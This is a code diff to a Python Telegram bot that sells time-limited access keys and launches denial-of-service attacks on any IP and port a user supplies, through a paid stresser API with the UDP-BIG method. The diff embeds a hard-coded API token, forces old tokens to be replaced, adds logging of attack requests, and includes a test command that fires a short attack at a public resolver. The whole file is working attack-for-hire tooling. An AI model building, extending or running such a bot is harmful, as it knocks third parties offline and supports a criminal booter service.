@@ -28,7 +28,7 @@ BOT_OWNER = 1987818347
 BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙄𝙓˼ ♪"
 
 DEFAULT_API_URL = "https://stresser.works/api/start"
-DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
+DEFAULT_API_TOKEN = "a05d4ed492744534ab9307b8d9930c2f6a3a8ffa6eea85d07825ec150215747a"
 DEFAULT_API_METHOD = "UDP-BIG"
 DEFAULT_API_GEOLOCATION = "ALL"
 
@@ -62,6 +62,10 @@ def load_data():
                         d.setdefault(k, v)
                     for sk, sv in default["settings"].items():
                         d["settings"].setdefault(sk, sv)
+                    # Force new token if old token present
+                    if d["settings"].get("api_token") == "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563":
+                        d["settings"]["api_token"] = DEFAULT_API_TOKEN
+                        d["settings"]["api_url"] = DEFAULT_API_URL
                     return d
         except: pass
     return default
@@ -73,6 +77,7 @@ def save_data(d):
     except: pass
 
 data = load_data()
+save_data(data)
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 
 # ============= RANDOM ROTATION =============
@@ -132,7 +137,6 @@ def has_valid_key(uid):
     except: return False
 
 def time_remaining(uid):
-    """Precise time remaining with days, hours, minutes, seconds"""
     if is_owner(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
     if is_reseller(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
     u = data["users"].get(str(uid))
@@ -154,15 +158,14 @@ def time_remaining(uid):
     except: return "❌ ᴇʀʀᴏʀ"
 
 def time_remaining_long(uid):
-    """Detailed time for profile"""
-    if is_owner(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
-    if is_reseller(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
+    if is_owner(uid): return "  ┗ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
+    if is_reseller(uid): return "  ┗ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
     u = data["users"].get(str(uid))
-    if not u or not u.get('key_expiry'): return "❌ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
+    if not u or not u.get('key_expiry'): return "  ┗ ❌ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
     try:
         rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
         total = int(rem.total_seconds())
-        if total <= 0: return "❌ ᴇxᴘɪʀᴇᴅ"
+        if total <= 0: return "  ┗ ❌ ᴇxᴘɪʀᴇᴅ"
         d = total // 86400
         h = (total % 86400) // 3600
         m = (total % 3600) // 60
@@ -173,7 +176,7 @@ def time_remaining_long(uid):
         if m > 0: lines.append(f"  ┣ ⏱️ ᴍɪɴᴜᴛᴇꜱ ➪ <b>{m}</b>")
         lines.append(f"  ┗ ⚡ ꜱᴇᴄᴏɴᴅꜱ ➪ <b>{s}</b>")
         return "\n".join(lines)
-    except: return "❌ ᴇʀʀᴏʀ"
+    except: return "  ┗ ❌ ᴇʀʀᴏʀ"
 
 def escape_html(text):
     if text is None:
@@ -205,9 +208,8 @@ def is_attack_running():
 def ist_now():
     return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
 
-# ============= BAN CHECK MIDDLEWARE =============
+# ============= BAN CHECK =============
 def check_ban(msg):
-    """Returns True if user is banned, sends premium ban message"""
     uid = msg.from_user.id
     if is_banned(uid):
         try:
@@ -234,7 +236,7 @@ def check_ban(msg):
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"🆔 <b>ʏᴏᴜʀ ɪᴅ:</b> <code>{uid}</code>\n"
                 f"📅 <b>ʙᴀɴɴᴇᴅ ᴀᴛ:</b> <code>{banned_at}</code>\n"
-                f"📝 <b>ʀᴇᴀꜱᴏɴ:</b> <i>{reason}</i>\n"
+                f"📝 <b>ʀᴇᴀꜱᴏɴ:</b> <i>{escape_html(reason)}</i>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                 "⚠️ <b>ᴀᴀᴘ ʙᴏᴛ ᴋᴀ ᴋᴏɪ ʙʜɪ ꜰᴇᴀᴛᴜʀᴇ ᴜꜱᴇ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                 "💬 <b>ᴜɴʙᴀɴ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ</b>\n"
@@ -257,10 +259,13 @@ def api_attack(ip, port, dur):
         method = get_setting("api_method", DEFAULT_API_METHOD)
         geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
         req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
+        print(f"🎯 API Request: {req}")
         resp = requests.get(req, timeout=10)
+        print(f"📡 API Response: {resp.status_code} - {resp.text[:200]}")
         if resp.status_code == 200: return True, resp.text
         return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
     except Exception as e:
+        print(f"⚠️ API Error: {e}")
         return False, str(e)
 
 # ============= KEYBOARDS =============
@@ -300,6 +305,7 @@ def cmd_start(msg):
         "⏳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠..."
     )
 
+    check = None
     chosen_pyf_start = get_random_pyf()
     if chosen_pyf_start:
         try:
@@ -368,7 +374,7 @@ def cmd_start(msg):
     if chosen_sticker:
         try:
             sticker_msg = bot.send_sticker(cid, chosen_sticker)
-            time.sleep(5)
+            time.sleep(3)
         except Exception as e:
             print(f"Sticker Error: {e}")
 
@@ -380,11 +386,11 @@ def cmd_start(msg):
 
     if is_new and not has_key:
         text = header + (
-            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ, {name}!</b>\n\n"
+            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ, {escape_html(name)}!</b>\n\n"
             "🎉 ᴀᴀᴘᴋᴀ ᴀᴄᴄᴏᴜɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʀᴇᴀᴛᴇ ʜᴏ ɢᴀʏᴀ!\n\n"
             "━━━━━━━━━━━━━━━━━━━━━\n"
             "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
-            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
+            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
             "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
             "━━━━━━━━━━━━━━━━━━━━━\n\n"
             "📌 <b>ᴋᴀɪꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴇ?</b>\n\n"
@@ -402,7 +408,7 @@ def cmd_start(msg):
         total_attacks = u.get("total_attacks", 0)
         role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")
         text = header + (
-            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {name}!</b>\n\n"
+            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {escape_html(name)}!</b>\n\n"
             "✅ <b>ᴋᴇʏ ᴠᴇʀɪꜰɪᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━\n"
             f"👤 <b>ʀᴏʟᴇ:</b> {role}\n"
@@ -414,14 +420,13 @@ def cmd_start(msg):
         )
     else:
         text = header + (
-            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {name}!</b>\n\n"
+            f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {escape_html(name)}!</b>\n\n"
             "━━━━━━━━━━━━━━━━━━━━━\n"
             "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
-            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
+            f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
             "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
             "━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n"
-            "ʏᴀ ᴀʙʜɪ ᴛᴀᴋ ʀᴇᴅᴇᴇᴍ ɴᴀʜɪ ᴋɪ!\n\n"
+            "⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
             "📌 <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
             "➤ <code>/redeem YOUR-KEY</code>\n\n"
             "🔑 ɴᴀʏᴀ ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.\n"
@@ -488,7 +493,7 @@ def cmd_attack(msg):
 
     ok, r = api_attack(ip, port, dur)
     if not ok:
-        bot.reply_to(msg, f"❌ <b>ꜰᴀɪʟᴇᴅ</b>\n<code>{r[:300]}</code>", parse_mode="HTML"); return
+        bot.reply_to(msg, f"❌ <b>ꜰᴀɪʟᴇᴅ</b>\n<code>{escape_html(r[:300])}</code>", parse_mode="HTML"); return
 
     attack_caption = (
         "╔══════════════════════════╗\n"
@@ -497,10 +502,10 @@ def cmd_attack(msg):
         "╭━━━━━━━━━━━━━━━━━━━━╮\n"
         "┃  ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
         "╰━━━━━━━━━━━━━━━━━━━━╯\n"
-        f"┣ 👤 ᴜꜱᴇʀ ➪ <b>@{name}</b>\n"
+        f"┣ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>\n"
         f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
         f"┣ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
-        f"┣ 🚀 ᴍᴇᴛʜᴏᴅ ➪ <b>{get_setting('api_method', 'UDP-BIG')}</b>\n"
+        f"┣ 🚀 ᴍᴇᴛʜᴏᴅ ➪ <b>{escape_html(get_setting('api_method', 'UDP-BIG'))}</b>\n"
         f"┗ 📅 ꜱᴛᴀʀᴛᴇᴅ ➪ <b>{ist_now()} IST</b>\n\n"
         "╔══════════════════════════╗\n"
         "║   🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 🔥   ║\n"
@@ -541,7 +546,7 @@ def cmd_attack(msg):
             "╚══════════════════════════╝\n\n"
             f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{ip}:{port}</code>\n"
             f"┣ ⏱️ ᴅᴜʀᴀᴛɪᴏɴ ➪ <b>{dur}ꜱ</b>\n"
-            f"┗ 👤 ᴜꜱᴇʀ ➪ <b>@{name}</b>"
+            f"┗ 👤 ᴜꜱᴇʀ ➪ <b>@{escape_html(name)}</b>"
         )
         chosen_video_done = get_random_video()
         if chosen_video_done:
@@ -598,20 +603,14 @@ def cmd_status(msg):
                 filled = int(pct / 10)
                 bar = "▰" * filled + "▱" * (10 - filled)
 
-                if pct < 20:
-                    st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
-                elif pct < 50:
-                    st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
-                elif pct < 80:
-                    st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
-                elif pct < 100:
-                    st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
-                else:
-                    st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"
+                if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
+                elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
+                elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
+                elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
+                else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"
 
                 target = escape_html(f"{atk.get('target', 'N/A')}:{atk.get('port', 'N/A')}")
                 uname = escape_html(atk.get('username', 'Unknown'))
-
                 rem_m = rem // 60
                 rem_s = rem % 60
 
@@ -695,12 +694,11 @@ def cmd_status(msg):
                 if "message is not modified" in err.lower(): continue
                 if "Too Many Requests" in err or "retry after" in err.lower():
                     time.sleep(5); continue
-                print(f"Auto Update Error: {e}")
                 break
 
     threading.Thread(target=auto_update, daemon=True).start()
 
-# ============= LIVE PROFILE (Auto-updating with precise time) =============
+# ============= LIVE PROFILE =============
 @bot.message_handler(commands=['profile'])
 def cmd_profile(msg):
     if check_ban(msg): return
@@ -721,7 +719,6 @@ def cmd_profile(msg):
             time_left = time_remaining(uid)
             time_detail = time_remaining_long(uid)
             
-            # Key expiry date
             expiry_date = "N/A"
             if u.get('key_expiry'):
                 try:
@@ -729,7 +726,6 @@ def cmd_profile(msg):
                     expiry_date = dt.strftime('%d %b %Y, %I:%M %p')
                 except: pass
             
-            # Joined date
             joined = "N/A"
             if u.get('joined_at'):
                 try:
@@ -737,7 +733,6 @@ def cmd_profile(msg):
                     joined = dt.strftime('%d %b %Y')
                 except: pass
             
-            # Account age
             age = "N/A"
             if u.get('joined_at'):
                 try:
@@ -1086,14 +1081,12 @@ def cmd_broadcast(msg):
             "┃   ✨ 𝗘𝗫𝗔𝗠𝗣𝗟𝗘𝗦 ✨\n"
             "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
             "🔸 <code>/broadcast Bot update ho gaya!</code>\n\n"
-            "🔸 <code>/broadcast New keys available - DM owner</code>\n\n"
-            "🔸 <code>/broadcast 🔥 Server is back online 🔥</code>\n\n"
+            "🔸 <code>/broadcast New keys available</code>\n\n"
             "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
             "┃   📊 𝗜𝗡𝗙𝗢 📊\n"
             "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
             f"👥 <b>ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:</b> <code>{len(data['users'])}</code>\n"
-            f"🚫 <b>ʙᴀɴɴᴇᴅ:</b> <code>{len(data.get('banned_users', {}))}</code>\n"
-            "📤 <b>ᴍᴇꜱꜱᴀɢᴇ ᴀʟʟ ᴀᴄᴛɪᴠᴇ ᴜꜱᴇʀꜱ ᴋᴏ ᴊᴀʏᴇɢᴀ\n\n"
+            f"🚫 <b>ʙᴀɴɴᴇᴅ:</b> <code>{len(data.get('banned_users', {}))}</code>\n\n"
             "╔══════════════════════════════╗\n"
             "║   💠 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 💠   ║\n"
             "╚══════════════════════════════╝"
@@ -1107,7 +1100,6 @@ def cmd_broadcast(msg):
     failed = 0
     banned_skip = 0
 
-    # Premium broadcast message
     broadcast_header = (
         "╔══════════════════════════════╗\n"
         "║   📢 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧 📢   ║\n"
@@ -1143,7 +1135,6 @@ def cmd_broadcast(msg):
     def do_broadcast():
         nonlocal sent, failed, banned_skip
         for i, uid_str in enumerate(list(data["users"].keys()), 1):
-            # Skip banned users
             if uid_str in data.get("banned_users", {}):
                 banned_skip += 1
                 continue
@@ -1152,12 +1143,7 @@ def cmd_broadcast(msg):
                 sent += 1
             except Exception as e:
                 failed += 1
-                err = str(e)
-                # If user blocked bot, mark them
-                if "blocked" in err.lower() or "chat not found" in err.lower() or "user is deactivated" in err.lower():
-                    pass
 
-            # Update every 5 users
             if i % 5 == 0 or i == total:
                 try:
                     bot.edit_message_text(
@@ -1177,9 +1163,8 @@ def cmd_broadcast(msg):
                         parse_mode="HTML"
                     )
                 except: pass
-            time.sleep(0.05)  # Anti-flood
+            time.sleep(0.05)
 
-        # Final report
         try:
             bot.edit_message_text(
                 chat_id=status_msg.chat.id,
@@ -1244,7 +1229,7 @@ def cmd_stats(msg):
         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
         f"┣ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>\n"
         f"┣ 🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ➪ <b>{'🟢 ᴏɴ' if get_setting('maintenance_mode', False) else '🔴 ᴏꜰꜰ'}</b>\n"
-        f"┗ 📡 ᴍᴇᴛʜᴏᴅ ➪ <code>{get_setting('api_method', 'UDP-BIG')}</code>\n\n"
+        f"┗ 📡 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n\n"
         "╔══════════════════════════════╗\n"
         "║   🔥 𝗕𝗢𝗧 𝗢𝗡𝗟𝗜𝗡𝗘 🔥   ║\n"
         "╚══════════════════════════════╝"
@@ -1277,7 +1262,6 @@ def cmd_ban(msg):
     }
     save_data(data)
 
-    # Notify the banned user
     try:
         ban_notification = (
             "╔══════════════════════════════╗\n"
@@ -1322,7 +1306,6 @@ def cmd_unban(msg):
     if target_id in data["banned_users"]:
         del data["banned_users"][target_id]; save_data(data)
 
-        # Notify unbanned user
         try:
             unban_notification = (
                 "╔══════════════════════════════╗\n"
@@ -1357,18 +1340,34 @@ def cmd_unban(msg):
 def cmd_setapi(msg):
     if not is_owner(msg.from_user.id): return
     p = msg.text.split()
-    if len(p) < 3: bot.reply_to(msg, "⚠️ /setapi URL TOKEN"); return
+    if len(p) < 3:
+        bot.reply_to(msg,
+            "📡 <b>ꜱᴇᴛ ᴀᴘɪ ᴜꜱᴀɢᴇ</b>\n\n"
+            "<code>/setapi URL TOKEN [METHOD] [GEO]</code>\n\n"
+            "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
+            "<code>/setapi https://stresser.works/api/start YOUR_TOKEN UDP-BIG ALL</code>",
+            parse_mode="HTML")
+        return
     set_setting("api_url", p[1]); set_setting("api_token", p[2])
     if len(p) > 3: set_setting("api_method", p[3])
     if len(p) > 4: set_setting("api_geolocation", p[4])
-    bot.reply_to(msg, "✅ <b>ᴀᴘɪ ᴜᴘᴅᴀᴛᴇᴅ!</b>", parse_mode="HTML")
+    bot.reply_to(msg,
+        "✅ <b>ᴀᴘɪ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n\n"
+        f"┣ 🔗 ᴜʀʟ ➪ <code>{escape_html(p[1])}</code>\n"
+        f"┣ 🔑 ᴛᴏᴋᴇɴ ➪ <code>{escape_html(p[2][:20])}...</code>\n"
+        f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
+        f"┗ 🌍 ɢᴇᴏ ➪ <code>{escape_html(get_setting('api_geolocation', 'ALL'))}</code>",
+        parse_mode="HTML")
 
 @bot.message_handler(commands=['testapi'])
 def cmd_testapi(msg):
     if not is_owner(msg.from_user.id): return
+    bot.reply_to(msg, "🧪 <b>ᴛᴇꜱᴛɪɴɢ ᴀᴘɪ...</b>", parse_mode="HTML")
     ok, r = api_attack("1.1.1.1", 80, 5)
-    if ok: bot.reply_to(msg, f"✅ <b>ᴀᴘɪ ᴏᴋ</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
-    else: bot.reply_to(msg, f"❌ <b>ᴀᴘɪ ꜰᴀɪʟᴇᴅ</b>\n<code>{r[:300]}</code>", parse_mode="HTML")
+    if ok:
+        bot.reply_to(msg, f"✅ <b>ᴀᴘɪ ᴡᴏʀᴋɪɴɢ</b>\n\n<code>{escape_html(r[:400])}</code>", parse_mode="HTML")
+    else:
+        bot.reply_to(msg, f"❌ <b>ᴀᴘɪ ꜰᴀɪʟᴇᴅ</b>\n\n<code>{escape_html(r[:400])}</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=['setmaxtime'])
 def cmd_setmaxtime(msg):
@@ -1462,6 +1461,8 @@ def cmd_delvideo(msg):
     except: bot.reply_to(msg, "❌ ᴜꜱᴀɢᴇ: <code>/delvideo NUMBER</code>", parse_mode="HTML")
 
 # ============= PYF VIDEO COMMANDS =============
+_pending_pyf = {}
+
 @bot.message_handler(commands=['addpyf'])
 def cmd_addpyf(msg):
     if not is_owner(msg.from_user.id): return
@@ -1503,6 +1504,7 @@ def cmd_delpyf(msg):
 @bot.message_handler(content_types=['sticker'])
 def auto_sticker(msg):
     uid = msg.from_user.id
+    if is_banned(uid): return
     if not is_owner(uid): return
     file_id = msg.sticker.file_id
     if file_id not in data["stickers"]:
@@ -1512,11 +1514,10 @@ def auto_sticker(msg):
         bot.reply_to(msg, "ℹ️ <b>ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.</b>", parse_mode="HTML")
 
 # ============= VIDEO HANDLER =============
-_pending_pyf = {}
-
 @bot.message_handler(content_types=['video'])
 def handle_video(msg):
     uid = msg.from_user.id
+    if is_banned(uid): return
     if not is_owner(uid): return
     file_id = msg.video.file_id
 
@@ -1620,17 +1621,29 @@ def btn_profile(msg): cmd_profile(msg)
 
 @bot.message_handler(func=lambda m: m.text == "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
 def btn_owner(msg):
-    if not is_owner(msg.from_user.id): return
-    bot.reply_to(msg, "👑 <b>ᴘᴀɴᴇʟ</b>", reply_markup=kb_owner(), parse_mode="HTML")
+    if not is_owner(msg.from_user.id):
+        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ!</b>", parse_mode="HTML")
+        return
+    bot.reply_to(msg, "👑 <b>ᴘᴀɴᴇʟ ᴏᴘᴇɴᴇᴅ</b>", reply_markup=kb_owner(), parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text == "🔑 𝐑𝐄𝐃𝐄𝐄𝐌")
 def btn_redeem(msg):
     if check_ban(msg): return
-    bot.reply_to(msg, "🔑 <code>/redeem KEY</code>", parse_mode="HTML")
+    bot.reply_to(msg,
+        "╔══════════════════════════════╗\n"
+        "║   🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬 🔑   ║\n"
+        "╚══════════════════════════════╝\n\n"
+        "📝 <b>ᴜꜱᴀɢᴇ:</b>\n"
+        "<code>/redeem YOUR-KEY</code>\n\n"
+        "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
+        "<code>/redeem VIP-A1B2-C3D4-E5F6</code>",
+        parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text == "🔑 𝐆𝐄𝐍 𝐊𝐄𝐘")
 def btn_genkey(msg):
-    if not is_owner(msg.from_user.id): return
+    if not is_owner(msg.from_user.id):
+        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ!</b>", parse_mode="HTML")
+        return
     txt = (
         "╔══════════════════════════════╗\n"
         "║   🔑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗠𝗔𝗞𝗘𝗥 🔑   ║\n"
@@ -1654,11 +1667,8 @@ def btn_genkey(msg):
         "┃   ✨ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗘𝗫𝗔𝗠𝗣𝗟𝗘𝗦 ✨\n"
         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
         "🔸 <code>/genkey 1d 5</code>\n"
-        "   └─ 5 ᴋᴇʏꜱ ᴏꜰ 1 ᴅᴀʏ ᴇᴀᴄʜ\n\n"
         "🔸 <code>/genkey 1month 10 VIP</code>\n"
-        "   └─ 10 VIP ᴋᴇʏꜱ ᴏꜰ 1 ᴍᴏɴᴛʜ\n\n"
-        "🔸 <code>/genkey 30m 1 TEST</code>\n"
-        "   └─ 1 TEST ᴋᴇʏ ᴏꜰ 30 ᴍɪɴᴜᴛᴇꜱ\n\n"
+        "🔸 <code>/genkey 30m 1 TEST</code>\n\n"
         "╔══════════════════════════════╗\n"
         "║   💠 𝗖𝗨𝗦𝗧𝗢𝗠 𝗡𝗔𝗠𝗘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 💠   ║\n"
         "╚══════════════════════════════╝\n"
@@ -1685,7 +1695,6 @@ def btn_broadcast(msg):
     if not is_owner(msg.from_user.id):
         bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!</b>", parse_mode="HTML")
         return
-    # Show broadcast instructions
     txt = (
         "╔══════════════════════════════╗\n"
         "║   📢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📢   ║\n"
@@ -1722,18 +1731,20 @@ def btn_settings(msg):
 def btn_close(msg):
     bot.reply_to(msg, "❌ <b>ᴄʟᴏꜱᴇᴅ.</b>", reply_markup=kb_main(msg.from_user.id), parse_mode="HTML")
 
-# ============= FALLBACK (Catches non-command messages from banned users) =============
-@bot.message_handler(func=lambda m: True, content_types=['text'])
-def fallback(msg):
-    if is_banned(msg.from_user.id):
-        check_ban(msg)
+# ============= FALLBACK FOR BANNED USERS ONLY =============
+@bot.message_handler(func=lambda m: is_banned(m.from_user.id), content_types=['text'])
+def banned_fallback(msg):
+    check_ban(msg)
 
 # ============= MAIN =============
 print("=" * 55)
 print(f"  {BOT_NAME}")
 print("=" * 55)
 print(f"  👑 Owner: {BOT_OWNER}")
-print(f"  📡 API: {get_setting('api_url', DEFAULT_API_URL)}")
+print(f"  📡 API URL: {get_setting('api_url', DEFAULT_API_URL)}")
+print(f"  🔑 API Token: {get_setting('api_token', DEFAULT_API_TOKEN)[:20]}...")
+print(f"  🎯 Method: {get_setting('api_method', DEFAULT_API_METHOD)}")
+print(f"  🌍 Geo: {get_setting('api_geolocation', DEFAULT_API_GEOLOCATION)}")
 print(f"  ⏱️ Max Time: {get_setting('max_attack_time', 300)}s")
 print(f"  ⏸️ Cooldown: {get_setting('user_cooldown', 5)}s")
 print("=" * 55)
@@ -1749,7 +1760,7 @@ while True:
             interval=0,
             timeout=20,
             long_polling_timeout=15,
-            allowed_updates=["message", "callback_query"]
+            allowed_updates=["message", "edited_message", "callback_query"]
         )
     except KeyboardInterrupt:
         print("\n🛑 Bot stopped.")
